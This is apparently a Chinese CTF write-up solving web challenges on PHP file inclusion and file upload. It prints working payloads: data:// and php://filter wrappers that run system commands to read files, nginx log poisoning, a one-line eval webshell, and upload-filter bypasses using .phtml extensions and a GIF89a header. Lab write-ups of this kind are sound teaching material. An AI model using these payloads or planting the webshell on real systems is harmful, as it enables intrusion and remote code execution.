# 文件包含

## EZFL
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783666101673_image.png)
有两段注释
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783666203900_image.png)
直接`?file=/flag.txt`



## EZFL_1
还是上一题的位置

![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783666483575_image.png)
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783667212802_image.png)
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783667168391_image.png)

## EZFL_2

![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783725879081_image.png)
1.`?file=php://filter/convert.iconv.UTF-8.UTF-16/resource=flag.php`base大概率被过滤了，换 iconv 这类编码，把内容转成 UTF-16 后再 include

-------------------------------------------------
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783726064441_image.png)
2.`?file=data:,<?php system('tac flag.php')?>`

data伪协议把后面的字符串伪装成文件内容，include 包含它时会解析执行其中的 PHP 代码。







## EZFL_3
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783725025986_image.png)
base64->`没有更多提示给你了，孩子。从现在开始，你得靠自己了。`
data伪协议

`?file=data:,<?php system('ls /')?>`

找到flag文件
`?file=data:,<?php system('cat /flag-SEYERldO4SFuwcvP5hKMwStLHW5yhI.txt')?>`



## EZFL_4
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783726714869_image.png)
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783726795323_image.png)

看样子吧php过滤了

`?file=data:,<?system('cat flag.php ')?>`

用通配符`*`: `?file=data:,<?system('cat f*')?>`然后查看源码

## EZFL_5
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783726979910_image.png)
把data伪协议过滤了,改用PHP伪协议
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783727340450_image.png)
用BP传POST

## EZFL_6
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1783824149540_image.png)
虽然把PHP和data都过滤了，但是还可以包含文件。
我们可以去包含日志，在日志中注入代码
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1784014104609_image.png)
`/etc/passwd`访问确认文件包含存在
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1784014309979_image.png)
日志目录`/var/log/nginx/access.log`

![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1784014997713_image.png)
可以找到`qingcenctf.txt`这个文件，直接`cat /qingcenctf.txt`即可

## EZFL_7
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1784015176647_image.png)




# 文件上传
## EZFU
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785027704804_image.png)
没有过滤，上传一个1.php 一句话木马`<?php eval($_POST[1]);?>`
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785027691055_image.png)
接下来就是一般操作

在目录中没找到flag，在phpinfo中发现了


## EZFU_1
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785027952567_image.png)
只让传照片了

![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785028107605_image.png)
前端验证，随便上传照片，抓包，直接修改后缀和内容。试了一下后端没有验证
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785028344376_image.png)

然后直接访问即可
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785028582720_image.png)
flag还是在phpinfo()中

## EZFU_2
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785028691764_image.png)
这次前端验证没了，上传一句话木马，显示文件类型不允许，后端加了校验。
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785028968660_image.png)
用1.txt试了一下，对文件内容也有验证，经过多次尝试对内容php 和= 有过滤

----
可以使用`.phtml`作为后缀

`.phtml` 本质**就是 PHP 文件**，和 `.php` 功能完全一致，只是后缀不同。

----
直接就上传了，内容也没有检验
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785030122194_image.png)

![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785030112059_image.png)


## EZFU_3
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785030539079_image.png)

不可以直接传脚本文件，抓包传

![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785030745290_image.png)
检验文件头了  
给文件内容加上文件头才能绕过，最简单的就是加 GIF 头，把上传文件内容改为：
 ``GIF89a <?php eval($_POST[1]);?>``
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785031024647_image.png)	

![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785030991845_image.png)




































